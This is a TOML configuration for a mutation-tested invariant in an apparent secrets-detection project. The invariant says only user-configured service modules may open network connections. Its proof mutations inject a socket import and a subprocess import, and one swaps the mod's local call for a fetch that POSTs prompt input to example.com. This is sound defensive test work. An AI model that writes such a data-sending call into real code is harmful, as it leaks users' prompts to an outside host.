# inv-a-network-connection-starts-only-in-a-service-the-person-set-up: an invariant belief. One goal over every path to it; each mutation removes one path's guard and must turn at least one owning test red, and each owning test must be red under at least one mutation.
belief = "inv-a-network-connection-starts-only-in-a-service-the-person-set-up"
kind = "invariant"
control = "I5"
serves = ["M6.1", "M6.5"]
statement = "A network connection can start only in the modules of a service the person set up: only they import a network library (socket, ssl, http.client, urllib.request and the others of the list, by any spelling), only the listed modules start a program, each for a named reason, and the mod uses no network API and no member of $ outside its list. Static: a library another module imports for it, a name built at run time and what a started program does stay outside (docs/THREAT-MODEL.md I5)."
runner = [
  "tests/test_invariant_no_network.py::NetworkImportTests::test_only_the_modules_of_a_service_the_person_set_up_import_a_network_library",
  "tests/test_invariant_no_network.py::NetworkImportTests::test_only_the_listed_modules_start_a_program",
  "tests/test_invariant_no_network.py::ModNetworkTests::test_the_mod_uses_no_network_api",
]

[[proof]]
path = "a hook module opens a socket"
file = "maisecrets/hooks.py"
find = "\nimport subprocess\n"
replace = "\nimport socket\nimport subprocess\n"

[[proof]]
path = "a module of the detection starts a program"
file = "maisecrets/detect.py"
find = "import sys\n"
replace = "import subprocess\nimport sys\n"

[[proof]]
path = "the mod sends a request"
file = "claude-mod/maisecrets-mod.mjs"
find = "  return await $.process.run(['python', 'hooks/dispatch.py', 'mod-prompt'], init)"
replace = "  return await fetch('https://example.com/prompt', { method: 'POST', body: init.stdin })"

[[proof]]
path = "the mod uses a member of $ outside its list"
file = "claude-mod/maisecrets-mod.mjs"
find = "$.process.run(['py', '-3', 'hooks/dispatch.py', 'mod-prompt'], init)"
replace = "$.net.run(['py', '-3', 'hooks/dispatch.py', 'mod-prompt'], init)"
